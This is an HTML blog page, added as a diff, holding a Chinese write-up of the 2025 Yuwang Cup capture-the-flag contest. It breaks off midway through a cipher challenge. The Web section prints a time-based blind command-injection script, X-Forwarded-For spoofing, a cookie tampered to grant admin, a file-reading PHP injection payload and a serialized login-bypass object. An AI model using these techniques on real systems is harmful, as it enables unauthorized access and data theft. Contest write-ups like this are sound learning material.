@@ -1,0 +1,344 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>2025御网杯wp | Midnight Phantasmagoria!</title><meta name="author" content="Fischl0527"><meta name="copyright" content="Fischl0527"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="排名及解题情况全国排名：  校内排名：  Misc 方向：  Crypto 方向：  Web 方向：  Webeasyweb一、题目截图  1.打开网页发现有一串php代码  二、解题思路 123456789&lt;?phpif(isset($_POST[&#x27;cmd&#x27;]))&#123;    @exec($_POST[&#x27;cmd&#x27;],$res,$rc);">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2025御网杯wp">
+<meta property="og:url" content="https://fischl0527.github.io/2025/05/11/2025CTF/2025%E5%BE%A1%E7%BD%91%E6%9D%AFwp/index.html">
+<meta property="og:site_name" content="Midnight Phantasmagoria!">
+<meta property="og:description" content="排名及解题情况全国排名：  校内排名：  Misc 方向：  Crypto 方向：  Web 方向：  Webeasyweb一、题目截图  1.打开网页发现有一串php代码  二、解题思路 123456789&lt;?phpif(isset($_POST[&#x27;cmd&#x27;]))&#123;    @exec($_POST[&#x27;cmd&#x27;],$res,$rc);">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://fischl0527.github.io/img/cover/2025%E5%BE%A1%E7%BD%91%E6%9D%AFwp.jpg">
+<meta property="article:published_time" content="2025-05-11T03:45:14.000Z">
+<meta property="article:modified_time" content="2025-07-08T09:22:10.515Z">
+<meta property="article:author" content="Fischl0527">
+<meta property="article:tag" content="Compete">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fischl0527.github.io/img/cover/2025%E5%BE%A1%E7%BD%91%E6%9D%AFwp.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "2025御网杯wp",
+  "url": "https://fischl0527.github.io/2025/05/11/2025CTF/2025%E5%BE%A1%E7%BD%91%E6%9D%AFwp/",
+  "image": "https://fischl0527.github.io/img/cover/2025%E5%BE%A1%E7%BD%91%E6%9D%AFwp.jpg",
+  "datePublished": "2025-05-11T03:45:14.000Z",
+  "dateModified": "2025-07-08T09:22:10.515Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Fischl0527",
+      "url": "https://fischl0527.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/null-5119bf9f9071d171.jpg"><link rel="canonical" href="https://fischl0527.github.io/2025/05/11/2025CTF/2025%E5%BE%A1%E7%BD%91%E6%9D%AFwp/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '2025御网杯wp',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/background.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/875E73166434C2B697688F4E9DB5AA6B.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archiveC"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/cover/2025御网杯wp.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Midnight Phantasmagoria!</span></a><a class="nav-page-title" href="/"><span class="site-name">2025御网杯wp</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archiveC"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">2025御网杯wp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-05-11T03:45:14.000Z" title="Created 2025-05-11 11:45:14">2025-05-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-07-08T09:22:10.515Z" title="Updated 2025-07-08 17:22:10">2025-07-08</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/2025CTF/">2025CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">1.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>7mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><meta name="referrer" content="no-referrer"/>
+
+<h1 id="排名及解题情况"><a href="#排名及解题情况" class="headerlink" title="排名及解题情况"></a>排名及解题情况</h1><p>全国排名：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747236960665-6896dc2a-db4a-4c1b-b624-c868af91f172.png"></p>
+<p>校内排名：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747236974900-9cc56df9-0c4c-43a4-b5c9-fe9f8cbb0a65.png"></p>
+<p>Misc 方向：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747236968665-1ff24064-4e5b-44cd-a3b7-a481c2d9c4e5.png"></p>
+<p>Crypto 方向：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747236982933-018cf965-9522-4fd8-b697-5ce3cc0e2093.png"></p>
+<p>Web 方向：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747236945920-f43077cd-fd7d-448d-8e0b-47f4b7b535bc.png"></p>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h2><p>一、题目截图</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234592825-7abaea37-b181-4908-a842-50e0948192a3.png"></p>
+<p>1.打开网页发现有一串php代码</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234593101-2a9e471c-4ce6-4226-aee8-448b74cb53a0.png"></p>
+<p>二、解题思路</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">exec</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>],<span class="variable">$res</span>,<span class="variable">$rc</span>);</span><br><span class="line">    <span class="comment">//echo $rc;</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;It works!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>2.进行分析</p>
+<p>无回显rce,因为提示flag在&#x2F;flag.txt里,所以直接时间盲注就行了,把文件里的内容时间盲注出来就行了</p>
+<p>3.脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&quot;http://47.105.113.86:40005&quot;</span></span><br><span class="line">charset = string.printable</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">timeout_threshold = <span class="number">4</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    found = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> charset:</span><br><span class="line">        payload = <span class="string">f&#x27;&#x27;&#x27;if [ &quot;$(cut -c<span class="subst">&#123;i&#125;</span> /flag.txt)&quot; = &quot;<span class="subst">&#123;c&#125;</span>&quot; ]; then sleep 5; fi&#x27;&#x27;&#x27;</span></span><br><span class="line">        start = time.time()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=&#123;<span class="string">&quot;cmd&quot;</span>: payload&#125;, timeout=<span class="number">6</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="keyword">if</span> end - start &gt; timeout_threshold:</span><br><span class="line">            flag += c</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">            found = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;End<span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">        Break</span><br></pre></td></tr></table></figure>
+
+<p>4.flag以及时间如下</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234593775-9d8bbd46-f286-4258-a132-b1ebf323df4b.png"></p>
+<h2 id="YWB-Web-xff"><a href="#YWB-Web-xff" class="headerlink" title="YWB_Web_xff"></a>YWB_Web_xff</h2><p>一、题目截图</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234594126-a55d983e-a309-486a-88a8-78e81a39f7c8.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234594361-9794e418-4e92-4075-ae82-dfdaf330b372.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234594703-60812545-14ee-4fe2-bace-bb2b49f144f9.png"></p>
+<p>二、解题思路</p>
+<p>1.看源码</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234595159-7d1d94da-0b8a-47ee-8ca7-651849f65e2d.png"></p>
+<p>2.分析源码</p>
+<p>重点在<font style="color:#001080;">$cip</font><font style="color:#000000;"> &#x3D;&#x3D; </font><font style="color:#A31515;">“2.2.2.1</font>上,说明要用xff伪造ip为2.2.2.1,</p>
+<p>3.进行网页操作</p>
+<p>输入1和1,hackbar进行操作</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234595502-3ab2703d-a778-407a-9693-99ec45b3eb9b.png"></p>
+<p>在X-Forwarded-For插入2.2.2.1就行了,flag和时间如下</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234595810-375972be-eea8-49c4-8515-14883286202e.png"></p>
+<h2 id="YWB-Web-未授权访问"><a href="#YWB-Web-未授权访问" class="headerlink" title="YWB_Web_未授权访问"></a>YWB_Web_未授权访问</h2><p>一、题目截图</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234596105-10851c72-101e-4149-a7ac-497fcbbe9f1f.png"></p>
+<p>二、解题思路</p>
+<p>看看cookie发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=O%3A5%3A%22Admin%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A5%3A%22guest%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A0%3B%7D</span><br></pre></td></tr></table></figure>
+
+<p>Url解码得到</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234596344-12c7290f-0bbe-4c23-afc1-3bf92922b73f.png"></p>
+<p>把后面的0改为1,guest改为admin就行了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=O%3A5%3A%22Admin%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A5%3A%22admin%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A1%3B%7D</span><br></pre></td></tr></table></figure>
+
+<p>flag以及时间如下</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234596777-62eeb39f-b543-4829-8baa-da54dc9bb48a.png"></p>
+<h2 id="YWB-Web-命令执行过滤绕过"><a href="#YWB-Web-命令执行过滤绕过" class="headerlink" title="YWB_Web_命令执行过滤绕过"></a>YWB_Web_命令执行过滤绕过</h2><p>一、题目截图</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234597034-9f208b6c-b5a7-4cff-b99b-47e8d3596e5e.png"></p>
+<p>二、解题思路</p>
+<p>1.分析代码</p>
+<p>看了下php代码,发现var_dump没有被ban,所以可以使用var_dump函数,并且命令里必须包含flag字眼,不仅如此,文件读取函数ffile_get_contents也允许使用,所以构造playload:?cmd&#x3D;var_dump(base64_encode(file_get_contents(‘flag.php’)));</p>
+<p>2.进行漏洞利用</p>
+<p>试一下这个playload出现了一串base64编码的字符</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234597317-b8c89e33-2805-4d95-a927-01258c07f27f.png"></p>
+<p>Cyberchef解码一下看看<img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234597594-115c0a8f-f5e6-4412-846c-52ecb80ad2ab.png"></p>
+<p>说明flag.php是这样的内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">  <span class="variable">$filename</span> = <span class="string">&quot;/tmp/flag.nisp&quot;</span>;</span><br><span class="line">  <span class="variable">$content</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>出现了&#x2F;tmp&#x2F;flag.nisp比较奇怪的文件,看看呢playload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=var_dump(base64_encode(file_get_contents(&#x27;/tmp/flag.nisp&#x27;)));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234597921-0f0399e3-662c-4b5b-9446-d13ab7a201f4.png"></p>
+<p>3.得到flag</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234598164-d31a8e98-3c26-4657-80bc-213467ecf280.png"></p>
+<h2 id="YWB-Web-反序列化"><a href="#YWB-Web-反序列化" class="headerlink" title="YWB_Web_反序列化"></a>YWB_Web_反序列化</h2><p>一、题目截图</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234598446-e459df21-9a86-4b8c-a545-853f002f3d6d.png"></p>
+<p>下载的源码</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234598745-9914e633-dd3a-4668-83aa-2d23262487db.png"></p>
+<p>二、解题思路</p>
+<p>1.分析源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;php&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="variable">$safe</span>, <span class="string">&quot;hack&quot;</span>, <span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mylogin</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>, <span class="variable">$pass</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user = <span class="variable">$user</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pass = <span class="variable">$pass</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;msg&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$filtered_input</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;msg&#x27;</span>]);</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$filtered_input</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span> <span class="keyword">instanceof</span> mylogin) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span>-&gt;pass === <span class="string">&quot;myzS@11wawq&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$tis</span> = <span class="string">&quot;您是小自吧,差一点就成功了!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$tis</span> = <span class="string">&quot;您输入的信息可能去非洲才能找到哦!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>提交的字符串中不能有flag和hack,否则就被替换成hack,影响反序列化。再看后面的if,需要我们的序列化的字符串pass &#x3D;&#x3D;&#x3D; myzS@11wawq,这样就绕过成功了</p>
+<p>2.构造playload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mylogin</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span> = <span class="string">&quot;test&quot;</span>, <span class="variable">$pass</span> = <span class="string">&quot;myzS@11wawq&quot;</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user = <span class="variable">$user</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pass = <span class="variable">$pass</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mylogin</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure>
+
+<p>输出结果是：O:7:”mylogin”:2:{s:4:”user”;s:4:”test”;s:4:”pass”;s:11:”myzS@11wawq”;}</p>
+<p>3.得到flag</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234599008-ca82b0bb-86c8-49e3-aeeb-39e2e2de4d83.png"></p>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="光隙中的寄生密钥"><a href="#光隙中的寄生密钥" class="headerlink" title="光隙中的寄生密钥"></a>光隙中的寄生密钥</h2><p>一、题目截图</p>
+<p>解压后的</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234599286-b5d2e5a2-9bba-41a8-86a1-5211d6bc08f2.png"></p>
+<p>二、解题思路</p>
+<p><font style="color:#515A6E;">拖进010editor进行分析</font></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234599606-073a5374-0f47-4e0c-b40d-165795ae75bd.png"></p>
+<p>发现最后面有PK开头的,说明藏了一个压缩包</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234599930-ba128366-db8b-47c9-9fc3-62f133614110.png"></p>
+<p>拖进kali进行分离</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234600330-d614e4cd-9580-482d-aa71-a63e0ae66245.png"></p>
+<p>再把压缩包拖回到windows里</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234600670-514e55df-0191-45d8-8c12-3ebfb83d01c2.png"></p>
+<p>解压发现需要密码</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234600948-8172e138-df78-49c9-be96-8c3967716b26.png"></p>
+<p>进行压缩包密码爆破</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234601294-a4620bda-0787-4bcc-a8d3-7e604863116c.png"></p>
+<p>发现有flag.txt,打开看看,是一串16进制的字符</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234601538-bf60c69a-291a-4de7-8577-faf1be4e1c9c.png"></p>
+<p>Cyberchef看看</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234601787-05bc5b10-21a9-4262-963a-f7f74716e190.png"></p>
+<p>解码后又是base64编码的字符</p>
+<p>解码后flag:</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234602104-d7147b06-f6e2-44c7-b320-40908f032589.png"></p>
+<h2 id="misc草甸方阵的密语"><a href="#misc草甸方阵的密语" class="headerlink" title="misc草甸方阵的密语"></a>misc草甸方阵的密语</h2><p>一、题目截图</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234602380-9d624462-b592-47fe-9569-3b7c8e1e24cb.png"></p>
+<p>二、解题思路</p>
+<p>1.看文件</p>
+<p>记事本看看.exe文件</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1747234602729-7073398f-6c8e-4b2b-a618-86115d78432d.png"></p>
+<p>发现是一串密码,根据题目提示的栅栏可凯撒,不难猜出这是栅栏加密和凯撒加密</p>
+<p>2.代码解密</p>
+<p>先栅栏密码解密</p>
+<p>解密代码如下</p>
